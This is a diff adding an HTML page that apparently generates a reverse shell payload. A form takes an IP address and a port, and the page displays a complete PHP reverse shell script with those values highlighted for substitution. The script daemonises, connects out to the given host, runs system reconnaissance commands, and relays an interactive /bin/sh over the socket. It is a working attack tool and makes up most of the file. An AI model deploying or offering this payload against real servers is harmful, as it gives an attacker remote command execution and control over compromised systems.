@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Document</title>
+    </head>
+    <body>
+        <form id="uploadReverseShell">
+            <label for="ip">IP: </label>
+            <input type="text" name="ip" id="ip" required />
+            <br />
+            <label for="port">端口: </label>
+            <input type="text" name="port" id="port" required />
+            <br />
+            <button type="submit">确定</button>
+        </form>
+        <div>
+            <pre>
+            <code>
+&lt;?php
+set_time_limit (0);
+$VERSION = &quot;1.0&quot;;
+$ip = &#x27;<mark>127.0.0.1</mark>&#x27;;
+$port = <mark>1234</mark>;
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = &#x27;uname -a; w; id; /bin/sh -i&#x27;;
+$daemon = 0;
+$debug = 0;
+if (function_exists(&#x27;pcntl_fork&#x27;)) {
+    $pid = pcntl_fork();
+    if ($pid == -1) {
+        printit(&quot;ERROR: Can&#x27;t fork&quot;);
+        exit(1);
+    }
+    if ($pid) {
+        exit(0);  
+    }
+    if (posix_setsid() == -1) {
+        printit(&quot;Error: Can&#x27;t setsid()&quot;);
+        exit(1);
+    }
+    $daemon = 1;
+} else {
+    printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);
+}
+chdir(&quot;/&quot;);
+umask(0);
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+    printit(&quot;$errstr ($errno)&quot;);
+    exit(1);
+}
+$descriptorspec = array(
+    0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  
+    1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  
+    2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)   
+);
+$process = proc_open($shell, $descriptorspec, $pipes);
+if (!is_resource($process)) {
+    printit(&quot;ERROR: Can&#x27;t spawn shell&quot;);
+    exit(1);
+}
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);
+while (1) {
+    if (feof($sock)) {
+        printit(&quot;ERROR: Shell connection terminated&quot;);
+        break;
+    }
+    if (feof($pipes[1])) {
+        printit(&quot;ERROR: Shell process terminated&quot;);
+        break;
+    }
+    $read_a = array($sock, $pipes[1], $pipes[2]);
+    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+    if (in_array($sock, $read_a)) {
+        if ($debug) printit(&quot;SOCK READ&quot;);
+        $input = fread($sock, $chunk_size);
+        if ($debug) printit(&quot;SOCK: $input&quot;);
+        fwrite($pipes[0], $input);
+    }
+    if (in_array($pipes[1], $read_a)) {
+        if ($debug) printit(&quot;STDOUT READ&quot;);
+        $input = fread($pipes[1], $chunk_size);
+        if ($debug) printit(&quot;STDOUT: $input&quot;);
+        fwrite($sock, $input);
+    }
+    if (in_array($pipes[2], $read_a)) {
+        if ($debug) printit(&quot;STDERR READ&quot;);
+        $input = fread($pipes[2], $chunk_size);
+        if ($debug) printit(&quot;STDERR: $input&quot;);
+        fwrite($sock, $input);
+    }
+}
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+function printit ($string) {
+    if (!$daemon) {
+        print &quot;$string\n&quot;;
+    }
+}
+?&gt; 
+            </code>
+        </pre>
+        </div>
+        <script type="module" src="reverseShell.js"></script>
+    </body>
+</html>
